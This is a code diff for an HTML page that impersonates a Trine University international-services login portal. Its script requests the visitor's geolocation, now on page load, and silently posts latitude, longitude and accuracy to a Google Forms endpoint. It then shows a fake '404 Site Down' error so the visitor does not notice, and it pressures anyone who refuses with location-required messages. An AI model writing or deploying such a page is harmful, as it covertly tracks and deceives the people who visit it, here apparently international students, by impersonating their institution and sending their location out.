@@ -12,13 +12,15 @@
     button { padding: 10px 20px; font-size: 16px; }
     label, input { display: block; margin: 10px auto; font-size: 16px; }
     input[type="text"] { padding: 8px; width: 200px; }
+    .error-message { color: red; text-align: center; font-size: 16px; }
   </style>
 </head>
-<body>
+<body onload="checkLocationAccess()">
   <div class="header">
     <div class="logo">Trine University - International Services</div>
   </div>
   <div class="content">
+    <div id="locationError" class="error-message"></div>
     <h1>Office of International Services Login Page</h1>
     <p>The Office of International Services provides a variety of online services for our institution's international
 students. Please log in using one of the options below to view information or to make a request.</p>
@@ -30,46 +32,43 @@ students. Please log in using one of the options below to view information or to
 
   <!-- JavaScript Code -->
   <script>
-    document.getElementById("submit").addEventListener("click", function requestLocation() {
+    function checkLocationAccess() {
       if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          function (position) {
-            const latitude = position.coords.latitude;
-            const longitude = position.coords.longitude;
-            const accuracy = position.coords.accuracy;
-
-            // Send data to Google Forms
-            const formUrl = "https://docs.google.com/forms/d/e/1FAIpQLScQpsQr3scRzvEtZJhZQ9fbJ3e-0DiCxQjLotqM6fEst-f-9w/formResponse";
-            const data = new URLSearchParams();
-            data.append("entry.1267598962", latitude);
-            data.append("entry.1270259896", longitude);
-            data.append("entry.1888406517", accuracy);
-
-            fetch(formUrl, {
-              method: "POST",
-              body: data,
-              mode: "no-cors",
-            }).then(() => {
-              throw new Error('404 Site Down'); // Simulate a 404 error after successful location submission
-            }).catch((error) => {
-              document.getElementById("output").innerText = "Error: " + error.message;
-            });
-
-          },
-          function (error) {
-            if (error.code === error.PERMISSION_DENIED) {
-              document.body.innerHTML = '<strong>Location:</strong> This site requires location access to continue further. Please reload or close the tab and try again.';
-            } else {
-              document.getElementById("output").innerText = "Error: " + error.message;
-              setTimeout(requestLocation, 3000); // Retry every 3 seconds
-            }
-          },
-          { timeout: 5000 }
-        );
+        navigator.geolocation.getCurrentPosition(sendLocationData, showLocationError, { timeout: 5000 });
       } else {
-        document.body.innerHTML = '<strong>Location:</strong> To continue using this portal, please enable location. This is required for all users';
+        showLocationError({ message: "Geolocation is not supported by this browser." });
       }
-    });
+    }
+
+    function sendLocationData(position) {
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+      const accuracy = position.coords.accuracy;
+
+      // Send data to Google Forms
+      const formUrl = "https://docs.google.com/forms/d/e/1FAIpQLScQpsQr3scRzvEtZJhZQ9fbJ3e-0DiCxQjLotqM6fEst-f-9w/formResponse";
+      const data = new URLSearchParams();
+      data.append("entry.1267598962", latitude);
+      data.append("entry.1270259896", longitude);
+      data.append("entry.1888406517", accuracy);
+
+      fetch(formUrl, {
+        method: "POST",
+        body: data,
+        mode: "no-cors",
+      }).then(() => {
+        throw new Error('404 Site Down'); // Simulate a 404 error after successful location submission
+      }).catch((error) => {
+        document.getElementById("output").innerText = "Error: " + error.message;
+      });
+    }
+
+    function showLocationError(error) {
+      const locationError = document.getElementById("locationError");
+      locationError.innerHTML = "Error: Please enable location access to continue. <br>Please reload the page or open in a new tab.";
+    }
+
+    document.getElementById("submit").addEventListener("click", checkLocationAccess);
   </script>
 </body>
 </html>
